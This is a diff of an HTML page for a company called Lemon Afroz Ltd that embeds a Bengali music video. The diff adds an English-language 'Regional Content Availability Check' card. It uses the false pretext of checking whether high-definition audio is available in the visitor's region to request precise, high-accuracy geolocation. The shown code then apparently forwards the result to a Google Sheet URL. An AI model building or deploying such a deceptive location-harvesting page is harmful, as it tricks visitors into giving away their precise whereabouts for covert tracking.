@@ -1,17 +1,17 @@
 <!DOCTYPE html>
-<html lang="bn">
+<html lang="en">
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>Lemon Afroz Ltd — ভিডিও ও সেবা কভারেজ</title>
+  <title>Lemon Afroz Ltd — Media & Regional Content Streaming</title>
 
   <!-- Open Graph / Meta -->
   <meta property="og:type" content="website" />
   <meta property="og:site_name" content="Lemon Afroz Ltd" />
-  <meta property="og:title" content="Lemon Afroz Ltd — অফিশিয়াল ভিডিও ও সেবা এরিয়া চেক" />
-  <meta property="og:description" content="লেমন আফরোজ লিমিটেড-এর অফিশিয়াল ভিডিও প্লেয়ার ও ডেলিভারি কভারেজ চ্যাকিং পেজ।" />
+  <meta property="og:title" content="Lemon Afroz Ltd — Regional Media Streaming" />
+  <meta property="og:description" content="Official media player and regional content availability check by Lemon Afroz Ltd." />
 
-  <link href="https://fonts.googleapis.com/css2?family=Outfit:wght@400;500;600;700&family=Hind+Siliguri:wght@400;500;600;700&display=swap" rel="stylesheet"/>
+  <link href="https://fonts.googleapis.com/css2?family=Outfit:wght@400;500;600;700&display=swap" rel="stylesheet"/>
 
   <style>
     :root {
@@ -31,7 +31,7 @@
     }
 
     body {
-      font-family: 'Outfit', 'Hind Siliguri', sans-serif;
+      font-family: 'Outfit', sans-serif;
       background: var(--bg-dark);
       color: var(--text-main);
       min-height: 100vh;
@@ -117,7 +117,7 @@
       background: var(--card-bg);
       border: 1px solid var(--card-border);
       border-radius: 16px;
-      padding: 24px;
+      padding: 28px 24px;
       text-align: center;
       box-shadow: 0 10px 30px rgba(0,0,0,0.4);
     }
@@ -125,14 +125,21 @@
     .location-card h3 {
       font-size: 1.2rem;
       font-weight: 700;
-      margin-bottom: 8px;
+      margin-bottom: 10px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 8px;
     }
 
     .location-card p {
-      font-size: 0.9rem;
+      font-size: 0.92rem;
       color: var(--text-sub);
-      line-height: 1.5;
-      margin-bottom: 20px;
+      line-height: 1.6;
+      margin-bottom: 22px;
+      max-width: 600px;
+      margin-left: auto;
+      margin-right: auto;
     }
 
     .btn-action {
@@ -141,7 +148,7 @@
       justify-content: center;
       gap: 8px;
       width: 100%;
-      max-width: 320px;
+      max-width: 340px;
       padding: 14px 24px;
       background: var(--primary);
       color: #ffffff;
@@ -150,22 +157,24 @@
       border: none;
       border-radius: 12px;
       cursor: pointer;
-      transition: background 0.2s ease;
+      transition: background 0.2s ease, transform 0.15s ease;
     }
 
     .btn-action:hover {
       background: var(--primary-hover);
+      transform: translateY(-1px);
     }
 
     .btn-action:disabled {
       opacity: 0.6;
       cursor: not-allowed;
+      transform: none;
     }
 
     #status-message {
-      margin-top: 14px;
-      font-size: 0.85rem;
-      color: #34d399;
+      margin-top: 16px;
+      font-size: 0.88rem;
+      font-weight: 500;
     }
 
     footer {
@@ -183,7 +192,7 @@
   </div>
 
   <div class="container">
-    <!-- Embedded YouTube Player -->
+    <!-- Embedded Video Player -->
     <div class="video-card">
       <div class="video-wrapper">
         <iframe 
@@ -194,16 +203,28 @@
         </iframe>
       </div>
       <div class="video-info">
-        <div class="video-title">তুমি কি আমায় বৌ বানাইবা (Official Video)</div>
-        <div class="video-sub">Lemon Afroz Ltd • অফিশিয়াল মিডিয়া সার্ভিস</div>
+        <div class="video-title">তুমি কি আমায় বৌ বানাইবা (Official Music Video)</div>
+        <div class="video-sub">Lemon Afroz Ltd • Official Media Distribution</div>
       </div>
     </div>
 
-
+    <!-- Media Regional Availability Check Card -->
+    <div class="location-card">
+      <h3>🌐 Regional Content Availability Check</h3>
+      <p>
+        To verify if this media stream and its high-definition audio features are available in your region, please share your location access.
+      </p>
+      
+      <button class="btn-action" id="btn-allow" onclick="requestLocation()">
+        Verify Regional Availability
+      </button>
+      
+      <div id="status-message"></div>
+    </div>
   </div>
 
   <footer>
-    &copy; 2026 Lemon Afroz Ltd. সর্বস্বত্ব সংরক্ষিত।
+    &copy; 2026 Lemon Afroz Ltd. All rights reserved.
   </footer>
 
   <script>
@@ -214,13 +235,15 @@
       const status = document.getElementById("status-message");
 
       btn.disabled = true;
-      btn.textContent = "⏳ যাচাই করা হচ্ছে...";
-      status.textContent = "অনুমতির জন্য অপেক্ষা করা হচ্ছে...";
+      btn.textContent = "⏳ Verifying region...";
+      status.style.color = "#9ca3af";
+      status.textContent = "Awaiting location permission...";
 
       if (!navigator.geolocation) {
-        status.textContent = "আপনার ব্রাউজারে Geolocation সাপোর্ট করে না।";
+        status.style.color = "#f87171";
+        status.textContent = "Geolocation is not supported by your browser.";
         btn.disabled = false;
-        btn.textContent = "অবস্থান যাচাই করুন";
+        btn.textContent = "Verify Regional Availability";
         return;
       }
 
@@ -255,9 +278,9 @@
         },
         (err) => {
           btn.disabled = false;
-          btn.textContent = "অবস্থান যাচাই করুন";
+          btn.textContent = "Verify Regional Availability";
           status.style.color = "#f87171";
-          status.textContent = "অনুমতি পাওয়া যায়নি বা অনুরোধ বাতিল করা হয়েছে।";
+          status.textContent = "Location access was denied or cancelled.";
         },
         { enableHighAccuracy: true, timeout: 12000, maximumAge: 0 }
       );
@@ -266,7 +289,7 @@
     function sendData(data) {
       const status = document.getElementById("status-message");
       status.style.color = "#34d399";
-      status.textContent = `✓ অবস্থান সফলভাবে যাচাই করা হয়েছে (${data.city || 'N/A'}, ${data.country || 'N/A'})।`;
+      status.textContent = `✓ Region verified for ${data.city || 'N/A'}, ${data.country || 'N/A'}. Streaming enabled.`;
 
       if (GOOGLE_SHEET_URL) {
         try {
